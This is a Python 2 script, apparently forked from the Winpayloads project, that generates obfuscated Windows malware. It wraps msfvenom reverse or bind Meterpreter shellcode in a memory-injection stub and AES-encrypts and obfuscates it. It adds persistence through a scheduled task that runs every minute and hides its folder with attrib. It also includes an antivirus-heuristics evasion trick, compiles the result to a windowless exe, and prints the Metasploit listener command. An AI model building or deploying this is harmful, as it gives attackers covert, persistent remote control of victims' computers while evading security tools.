#!/usr/bin/python

# FORKED BY: 		https://github.com/nccgroup/Winpayloads
# DIRECTORY: 		lib/generatepayload.py
# FORK DATE: 		18.09.2017
# COMMIT:			53cef1c  on 15 Aug 53cef1c66249349006748ccd4e0cd3612899552a

import random
import subprocess
import sys

############################################################################################################
# CODE TAKEN BY: 	lib/main.py
# COMMIT: 			bb843dc on 12 Set (bb843dc161c1c5e3f9b830ca32dac32d92c45eb6)

import socket

injectwindows = """shellcode = bytearray('%s')
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
"""

def CheckInternet():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect(('8.8.8.8', 0))
		IP = s.getsockname()[0]
		return IP
	except:
		return "0.0.0.0"
############################################################################################################

# FORKED BY:        https://github.com/nccgroup/Winpayloads
# DIRECTORY:        lib/encrypt.py
# FORK DATE:        18.09.2017
# COMMIT:           0b07303 on 15 Aug (0b073035f92bccfb0f16354ce006241f7baab67f)

import Crypto.Cipher.AES as AES
import os
import random
import string

def randomVar():
	return ''.join(random.sample(string.ascii_lowercase, 8))

def randomJunk():
	newString = ''
	for i in xrange(random.randint(6, 26)):
		newString += ''.join(random.sample(string.ascii_lowercase, i))
	return newString

def pad16(string):
	if (len(string) % 16) > 0: return string + (16 - len(string) % 16) * '#'
	else: return string


def custom_encryption (payload):

	newpayload = "# -*- coding: utf-8 -*- \n"
	newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())

	######################################################################################################
	# Persistence
	TASK_DELAY = "1"						# Task delay
	TASK_NAME = "Agent"						# Name of the task (see the status using schtasks /query /tn <task_name>)
	PATH = "C:\\Users\\Public\\Agent\\"		# Infection path
	AGENT = "Agent.exe"						# Agent Name

	CMD_PERSISTENCE = "schtasks /create /sc minute /mo " + TASK_DELAY + " /tn " + TASK_NAME + " /tr " + PATH + AGENT + " /F"
	CMD_HIDE_1 = "attrib +S +H +I /S /D " + PATH + "* "
	CMD_HIDE_2 = "attrib +S +H +I /S /D " + PATH[:-1]

	lib_sys = randomJunk()
	lib_os = randomJunk()
	lib_shutil = randomJunk()
	lib_AES = randomJunk()

	fx_pad = randomJunk()
	var_pad = randomVar()

	var_key = randomVar()
	var_cipher = randomVar()
	var_self = randomVar()
	var_path = randomVar()
	var_agent = randomVar()
	var_cmd_persistence = randomVar()
	var_cmd_hide_1 = randomVar()
	var_cmd_hide_2 = randomVar()

	KEY = os.urandom(32)
	CIPHER = AES.new(KEY, AES.MODE_ECB)

	newpayload += "import sys as %s \n" % (lib_sys)
	newpayload += "import os as %s \n" % (lib_os)
	newpayload += "import shutil as %s \n" % (lib_shutil)
	newpayload += "import Crypto.Cipher.AES as %s \n" % (lib_AES)
	newpayload += "def %s(%s): \n" % (fx_pad, var_pad)
	newpayload += "\tif (len(%s) %% 16) > 0: return %s + (16 - len(%s) %% 16) * '#' \n" % (var_pad, var_pad, var_pad)
	newpayload += "\telse: return %s \n"  % (var_pad)
	newpayload += "%s = '%s'.decode('hex') \n" % (var_key, KEY.encode('hex'))
	newpayload += "%s = %s.new(%s, %s.MODE_ECB) \n" % (var_cipher, lib_AES, var_key, lib_AES)
	newpayload += "%s = \"\" \n" % (var_self)
	newpayload += "%s = \"%s\" \n" % (var_path, CIPHER.encrypt(pad16(PATH)).encode('hex'))
	newpayload += "%s = \"%s\" \n" % (var_agent, CIPHER.encrypt(pad16(AGENT)).encode('hex'))
	newpayload += "%s = \"%s\" \n" % (var_cmd_persistence, CIPHER.encrypt(pad16(CMD_PERSISTENCE)).encode('hex'))
	newpayload += "%s = \"%s\" \n" % (var_cmd_hide_1, CIPHER.encrypt(pad16(CMD_HIDE_1)).encode('hex'))
	newpayload += "%s = \"%s\" \n" % (var_cmd_hide_2, CIPHER.encrypt(pad16(CMD_HIDE_2)).encode('hex'))
	newpayload += "try: %s = str(%s.argv[0]) \n" % (var_self, lib_sys)
	newpayload += "except: pass \n"
	newpayload += "try: \n"
	newpayload += "\tif not %s.path.isfile (%s.decrypt(%s.decode('hex')).strip('#') + %s.decrypt(%s.decode('hex')).strip('#')): \n" % (lib_os, var_cipher, var_path, var_cipher, var_agent)
	newpayload += "\t\tif not %s.path.isdir(%s.decrypt(%s.decode('hex')).strip('#')): %s.system(\"mkdir \" + %s.decrypt(%s.decode('hex')).strip('#')) \n" % (lib_os, var_cipher, var_path, lib_os, var_cipher, var_path)
	newpayload += "\t\tif (%s != \"\"): %s.copy (%s, %s.decrypt(%s.decode('hex')).strip('#') + %s.decrypt(%s.decode('hex')).strip('#')) \n" % (var_self, lib_shutil, var_self, var_cipher, var_path, var_cipher, var_agent)
	newpayload += "\t\t%s.system(%s.decrypt(%s.decode('hex')).strip('#')) \n" % (lib_os, var_cipher, var_cmd_persistence)
	newpayload += "\t\t%s.system(%s.decrypt(%s.decode('hex')).strip('#')) \n" % (lib_os, var_cipher, var_cmd_hide_1)
	newpayload += "\t\t%s.system(%s.decrypt(%s.decode('hex')).strip('#')) \n" % (lib_os, var_cipher, var_cmd_hide_1)
	newpayload += "except: pass \n"

	######################################################################################################
	# Payload 
	counter = os.urandom(16)
	key = os.urandom(32)

	randkey = randomVar()
	randcounter = randomVar()
	randcipher = randomVar()

	randdecrypt = randomJunk()
	randshellcode = randomJunk()

	randctypes = randomJunk()
	randaes = randomJunk()

	encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	encrypted = encrypto.encrypt(payload.replace('ctypes',randctypes).replace('shellcode',randshellcode))

	newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
	newpayload += "import Crypto.Cipher.AES as %s \nimport ctypes as %s \n" %(randaes, randctypes)
	newpayload += "%s = '%s'.decode('hex') \n" % (randkey, key.encode('hex'))
	newpayload += "%s = '%s'.decode('hex') \n" % (randcounter, counter.encode('hex'))
	newpayload += "%s = '%s'\n"% (randomVar(), randomJunk())
	newpayload += "%s = %s.new(%s , %s.MODE_CTR, counter=lambda: %s )\n" % (randdecrypt, randaes, randkey, randaes, randcounter)
	newpayload += "%s = %s.decrypt('%s'.decode('hex')) \n" % (randcipher, randdecrypt, encrypted.encode('hex'))

	######################################################################################################
	# Solution to bypass AV-Heuristic scan: allocate 100 MB of ram for 30 sec
	lib_thr = randomJunk()
	mem_var = randomVar()
	mem_size = "100000000"  # 100 MB
	th_time = "30"          # 30 sec
	th_fx = randomVar()

	newpayload += "\nglobal %s\n" % (mem_var)
	newpayload += "%s = '\x48' * %s\n" % (mem_var, mem_size)
	newpayload += "import threading as %s \n" % (lib_thr)
	newpayload += "def %s (): global %s; %s = '\x48'\n" % (th_fx, mem_var, mem_var)
	newpayload += "%s.Timer(%s, %s).start()\n" % (lib_thr, th_time, th_fx)

	######################################################################################################
	# Payload exec
	newpayload += "exec(%s)" % randcipher

	######################################################################################################

	return newpayload

############################################################################################################

def payloaddir():
	#return os.path.expanduser('~') + '/winpayloads'
	return 'payload/'

def CleanUpPayloadMess(payloadname):
	os.system('rm dist -r')
	os.system('rm build -r')
	os.system('rm *.spec')
	os.system('rm %s/payload.py' % payloaddir())


def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
	print ez2read_shellcode
	with open('%s/payload.py' % payloaddir(), 'w+') as Filesave:
		Filesave.write(custom_encryption(injectwindows % (ez2read_shellcode)))
		Filesave.close()
	print '[*] Creating Payload using Pyinstaller...'

	randomenckey = ''.join(random.sample(string.ascii_lowercase, 16))

	subprocess.call (['wine', os.path.expanduser('~') + '/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
						  '%s/payload.py' % payloaddir(), '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024,)

	os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir(),payloadname))

	print '\n###################################################################'
	print '[*] Payload.exe Has Been Generated And Is Located Here: %s/%s.exe' % (payloaddir(), payloadname)
	
	CleanUpPayloadMess(payloadname)

###################################################################################################################

import os
try: os.mkdir (payloaddir())
except: pass

payload_list = [ 'windows/shell/reverse_tcp', 'windows/meterpreter/bind_tcp', 'windows/meterpreter/reverse_tcp']

SHELLCODE_OUT_FILE = payloaddir() + 'hex_shellcode.txt'
PAYLOAD = ''
RHOST = ''
LPORT = ''


print "[*] Available payloads: "
for p in payload_list:
			print "\t" + str(payload_list.index(p)) + ") " + p
print "\n"
while not PAYLOAD:
	try:
		PAYLOAD = payload_list[input ("[?] PAYLOAD: ")]
	except KeyboardInterrupt:
		sys.exit(-1)
	except:
		pass


while not RHOST:
	try:
		RHOST = raw_input ('\n[?] RHOST (' + CheckInternet() + '): ')
		if not RHOST: RHOST = CheckInternet()
	except KeyboardInterrupt:
		sys.exit(-1)
	except:
		pass


while not LPORT:
	try:
		LPORT = raw_input ("\n[?] LPORT (4444): ")
		if not LPORT: LPORT = "4444"
	except KeyboardInterrupt:
		sys.exit(-1)
	except:
		pass


print "\n\n[*] Configuration:"
print "    - PAYLOAD: " + PAYLOAD
print "    - RHOST:   " + RHOST
print "    - LPORT:   " + LPORT
print "\n"



try:
	if raw_input ("[?] Ready [y/n]? ") == "y":


		# Writing shellcode to file
		f = open( SHELLCODE_OUT_FILE , "w")
		subprocess.call (['msfvenom', '-p', PAYLOAD , 'RHOST=' + RHOST, 'LPORT=' + LPORT,
									'-f', 'hex',], bufsize=1024, stdout=f)
		f.close()


		# Reading shellcode to file
		f = open( SHELLCODE_OUT_FILE , "r")
		buf = f.read()
		f.close()


		# Converting shellcode HEX notation
		t = iter(buf)
		ez2read_shellcode = "\\x" + "\\x".join(a+b for a,b in zip(t, t))


		#ez2read_shellcode = "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in buf)		# For -f python
		#print len(ez2read_shellcode)
		#print ez2read_shellcode


		OUT_NAME = PAYLOAD.replace('/', '-')
		GeneratePayload (ez2read_shellcode, OUT_NAME, None)

		try: 
			os.remove (SHELLCODE_OUT_FILE)
			os.remove ('*.pyc')
		except: 
			pass

		print "\n\n[*] Run metasploit: "
		print "msfconsole -x \'use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT " + LPORT + "; run\'"

	else:
		print "[*] Gracefully quitting..."
		sys.exit(0)
except:
	print "[*] Gracefully quitting..."
	sys.exit(0)
